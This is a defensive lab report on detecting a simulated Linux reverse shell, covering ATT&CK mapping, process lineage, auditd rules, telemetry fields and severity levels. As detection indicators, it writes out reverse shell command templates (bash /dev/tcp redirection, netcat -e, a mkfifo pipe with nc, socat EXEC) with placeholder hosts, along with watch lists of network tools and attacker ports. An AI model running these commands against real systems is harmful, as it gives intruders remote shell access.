# Reverse Shell Execution Investigation

---

# Overview

This investigation document analyzes the reverse shell execution simulation conducted within the Detection Engineering Lab environment.

The investigation focuses on identifying:

- shell execution behavior
- suspicious process lineage
- outbound callback activity
- reverse shell command execution
- attacker-controlled remote access behavior
- process-to-network correlation

The objective is to validate whether the observed activity is consistent with Linux reverse shell execution and post-exploitation remote access techniques.

---

# Investigation Summary

## Investigation Type

Reverse Shell Execution Analysis

## Technique Classification

| Category | Technique |
|---|---|
| Execution | T1059 — Command and Scripting Interpreter |
| Unix Shell | T1059.004 |
| Command and Control | T1071 |
| Tool Transfer | T1105 |

---

# Initial Detection Context

The investigation was initiated after suspicious shell execution activity was observed on the Linux host.

Behavioral indicators included:

- bash execution
- interactive shell invocation
- suspicious command-line syntax
- outbound TCP communication
- networking utility execution
- shell-to-network behavioral correlation

---

# Investigation Objectives

The investigation aimed to determine:

- whether a reverse shell was executed
- whether outbound callback activity occurred
- whether suspicious process lineage existed
- whether attacker-like command syntax was observed
- whether the activity matched known reverse shell tradecraft
- whether telemetry supported detection engineering validation

---

# Environment Details

| Field | Value |
|---|---|
| Platform | Linux |
| Host Type | Ubuntu Virtual Machine |
| Telemetry Sources | auditd, process telemetry |
| Investigation Scope | Local simulation environment |
| Detection Platform | Sigma-compatible detection logic |

---

# Investigation Workflow

The investigation followed the standard detection engineering workflow:

```text
Simulation
    ↓
Telemetry Collection
    ↓
Process Investigation
    ↓
Command Analysis
    ↓
Network Correlation
    ↓
Threat Mapping
    ↓
Detection Validation
    ↓
Evidence Collection
```

---

# Observed Behavioral Indicators

## Shell Execution Activity

Suspicious shell interpreters observed:

```text
/bin/bash
/bin/sh
```

Indicators included:

- interactive shell execution
- shell redirection
- outbound communication attempts
- suspicious execution chains

---

# Interactive Shell Indicators

The investigation identified command-line syntax commonly associated with reverse shells.

## Observed Patterns

```bash
bash -i
```

```bash
/dev/tcp/
```

```bash
0>&1
```

These patterns strongly indicate interactive shell redirection behavior.

---

# Reverse Shell Behavioral Analysis

## Expected Reverse Shell Flow

```text
Shell Process
    ↓
Network-Capable Utility
    ↓
Outbound Connection
    ↓
Remote Listener
```

---

# Suspicious Utilities Identified

The investigation focused on utilities frequently abused for reverse shell activity.

## Monitored Utilities

```text
nc
netcat
curl
wget
python
perl
php
socat
openssl
```

These utilities are commonly used to establish outbound callback sessions.

---

# Process Lineage Investigation

## Investigation Goal

Determine whether suspicious parent-child process relationships existed.

---

# Suspicious Parent Processes

| Parent Process | Investigation Relevance |
|---|---|
| apache2 | possible web exploitation |
| nginx | web shell activity |
| python | scripting abuse |
| perl | script execution |
| cron | persistence-triggered execution |
| systemd | service-based execution |

---

# Example Suspicious Chains

## Web Exploitation Scenario

```text
apache2
 └── bash
      └── nc
```

---

## Malicious Service Execution

```text
systemd
 └── bash
      └── outbound connection
```

---

## Script-Based Reverse Shell

```text
python
 └── sh
      └── TCP callback
```

---

# Network Activity Investigation

## Objective

Determine whether shell activity correlated with outbound network communication.

---

# Observed Network Indicators

Potential reverse shell indicators included:

- outbound TCP communication
- callback behavior
- shell-linked network activity
- suspicious external destinations
- uncommon network destinations
- interactive session behavior

---

# High-Risk Reverse Shell Ports

The following ports were monitored due to common attacker usage:

```text
4444
4445
5555
8080
9001
1337
```

The investigation does not rely exclusively on ports because attackers can use arbitrary ports.

---

# Command-Line Investigation

## Objective

Identify known reverse shell syntax patterns.

---

# Bash TCP Redirection

## Example Pattern

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

## Indicators

- `/dev/tcp/`
- interactive shell
- descriptor redirection
- outbound shell communication

---

# Netcat Reverse Shell

## Example Pattern

```bash
nc -e /bin/bash IP PORT
```

## Indicators

- shell execution through netcat
- direct TCP callback capability

---

# FIFO Reverse Shell

## Example Pattern

```bash
mkfifo /tmp/f; nc IP PORT < /tmp/f | /bin/sh > /tmp/f
```

## Indicators

- named pipe creation
- shell redirection
- command piping behavior

---

# Python Reverse Shell

## Example Pattern

```python
python -c 'import socket,subprocess,os'
```

## Indicators

- socket module usage
- subprocess spawning
- inline code execution

---

# Socat Reverse Shell

## Example Pattern

```bash
socat TCP:IP:PORT EXEC:/bin/bash
```

## Indicators

- shell execution through socket relay
- TCP callback creation

---

# Auditd Investigation

## Objective

Validate whether auditd telemetry captured execution activity.

---

# Relevant Syscalls

```text
execve
connect
socket
dup2
```

---

# Investigation Findings

The simulation revealed several important telemetry observations:

- shell execution visibility depended on active auditd rules
- execve monitoring was required for reliable shell telemetry
- outbound network visibility depended on connect/socket monitoring
- process lineage quality depended heavily on PID and PPID telemetry
- shell-to-network correlation produced stronger detection fidelity than isolated events

---

# Relevant Auditd Rules

## Process Execution Monitoring

```bash
-a always,exit -F arch=b64 -S execve -k exec_monitor
```

---

## Network Connection Monitoring

```bash
-a always,exit -F arch=b64 -S connect -k network_connect
```

---

## Socket Monitoring

```bash
-a always,exit -F arch=b64 -S socket -k socket_monitor
```

---

# Telemetry Analysis

# Required Process Telemetry

| Field | Investigation Use |
|---|---|
| Image | executed binary |
| CommandLine | reverse shell syntax |
| ParentImage | process lineage |
| PID | process tracking |
| PPID | parent-child correlation |
| User | execution context |
| Timestamp | event sequencing |

---

# Required Network Telemetry

| Field | Investigation Use |
|---|---|
| SourceIP | affected system |
| DestinationIP | callback destination |
| DestinationPort | remote listener |
| Protocol | TCP/UDP |
| ProcessName | originating process |
| PID | telemetry correlation |

---

# Detection Validation Analysis

## Detection Logic Validation

The investigation confirmed that reliable reverse shell detection depends on:

```text
Shell Execution
    +
Process Lineage
    +
Outbound Network Activity
    +
Suspicious Command Syntax
```

Single-event detections were determined to be significantly weaker.

Behavioral correlation produced stronger detection fidelity.

---

# Threat Assessment

## Threat Classification

The observed behavior is consistent with:

- post-exploitation activity
- unauthorized remote shell access
- command-and-control behavior
- interactive attacker access
- remote execution techniques

---

# Severity Assessment

| Severity | Condition |
|---|---|
| Critical | shell + outbound callback confirmed |
| High | shell spawned networking utility |
| Medium | suspicious shell lineage |
| Low | isolated shell anomaly |

---

# False Positive Considerations

## Potential Legitimate Sources

Possible benign explanations include:

- authorized penetration testing
- administrative troubleshooting
- internal automation
- CI/CD execution pipelines
- development environments
- approved remote management tooling

---

# False Positive Reduction

Recommended exclusions:

- trusted management servers
- approved automation frameworks
- monitoring infrastructure
- internal testing systems
- sanctioned administrative utilities

---

# Investigation Conclusion

The simulation successfully generated telemetry associated with Linux reverse shell execution behavior.

The investigation confirmed the presence of:

- shell execution activity
- suspicious command-line syntax
- process lineage indicators
- outbound callback behavior
- reverse shell execution patterns

The collected telemetry supports:

- ATT&CK-aligned detection engineering
- Sigma rule development
- behavioral analytics validation
- process-to-network correlation strategies

The investigation also demonstrated that:

- isolated shell detections are insufficient
- behavioral correlation significantly improves fidelity
- shell-to-network analytics are critical for reliable detection
- process lineage is essential for investigation context

---

# Recommended Evidence Collection

| Evidence | Purpose |
|---|---|
| reverse-shell-terminal.png | shell execution proof |
| process-lineage-proof.png | parent-child relationships |
| outbound-connection-proof.png | callback evidence |
| auditd-execve-proof.png | syscall telemetry |
| detection-trigger-proof.png | Sigma validation |
| listener-session-proof.png | remote shell confirmation |

---

# Recommended Repository Placement

```text
investigations/
└── reverse-shell-execution-investigation.md
```

---

# Final Investigation Outcome

## Investigation Status

SUCCESSFUL

## Detection Engineering Outcome

VALIDATED

## Telemetry Quality

SUFFICIENT FOR DETECTION ENGINEERING

## Reverse Shell Behavior Confirmation

CONFIRMED

## Detection Readiness

READY FOR VALIDATION AND EVIDENCE COLLECTION
